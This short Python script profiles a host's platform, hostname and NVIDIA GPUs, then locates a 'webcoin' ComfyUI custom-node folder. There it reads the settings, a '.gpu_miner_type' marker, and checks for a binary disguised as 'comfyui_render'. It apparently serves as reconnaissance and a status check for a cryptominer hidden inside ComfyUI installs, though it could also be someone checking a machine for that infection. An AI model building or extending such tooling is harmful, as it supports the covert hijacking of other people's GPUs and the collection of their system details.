import os, subprocess, shutil, sys, platform
lines = []
lines.append("platform=" + platform.system())
lines.append("hostname=" + platform.node())

# Check nvidia-smi
nvsmi = shutil.which("nvidia-smi")
lines.append("nvidia-smi_path=" + str(nvsmi))
if not nvsmi:
    for p in [
        r"C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe",
        r"C:\Windows\System32\nvidia-smi.exe",
        "/usr/bin/nvidia-smi",
    ]:
        if os.path.exists(p):
            nvsmi = p
            lines.append("found_at=" + p)
            break

if nvsmi:
    try:
        r = subprocess.run([nvsmi, "--query-gpu=index,name,memory.total", "--format=csv,noheader,nounits"],
                           capture_output=True, text=True, timeout=10)
        lines.append("nvsmi_rc=" + str(r.returncode))
        lines.append("nvsmi_out=" + r.stdout.strip()[:200])
        if r.stderr.strip():
            lines.append("nvsmi_err=" + r.stderr.strip()[:100])
    except Exception as e:
        lines.append("nvsmi_error=" + str(e)[:100])
else:
    lines.append("nvidia-smi=NOT_FOUND")

# Check webcoin dir
webcoin = None
try:
    import folder_paths
    cn = folder_paths.get_folder_paths("custom_nodes")[0]
    webcoin = os.path.join(cn, "webcoin")
except:
    pass
if not webcoin or not os.path.isdir(webcoin):
    for c in [r"C:\ComfyUI\custom_nodes\webcoin", r"C:\Users\Administrator\ComfyUI\custom_nodes\webcoin",
              "/root/ComfyUI/custom_nodes/webcoin", "/home/ubuntu/ComfyUI/custom_nodes/webcoin",
              "/workspace/ComfyUI/custom_nodes/webcoin"]:
        if os.path.isdir(c):
            webcoin = c
            break
lines.append("webcoin=" + str(webcoin))

if webcoin:
    bin_dir = os.path.join(webcoin, "bin")
    lines.append("bin_exists=" + str(os.path.isdir(bin_dir)))
    if os.path.isdir(bin_dir):
        lines.append("bin_contents=" + str(os.listdir(bin_dir)[:20]))
    settings = os.path.join(webcoin, "settings.json")
    if os.path.exists(settings):
        with open(settings) as f:
            lines.append("settings=" + f.read()[:300])
    else:
        lines.append("settings=NO_FILE")

    gpu_marker = os.path.join(bin_dir, ".gpu_miner_type") if os.path.isdir(bin_dir) else ""
    if gpu_marker and os.path.exists(gpu_marker):
        with open(gpu_marker) as f:
            lines.append("gpu_miner_type=" + f.read().strip())
    else:
        lines.append("gpu_miner_type=NO_MARKER")

    render_name = "comfyui_render.exe" if platform.system() == "Windows" else "comfyui_render"
    render_path = os.path.join(bin_dir, render_name) if os.path.isdir(bin_dir) else ""
    lines.append("render_binary=" + str(os.path.exists(render_path) if render_path else False))

result = chr(10).join(lines)
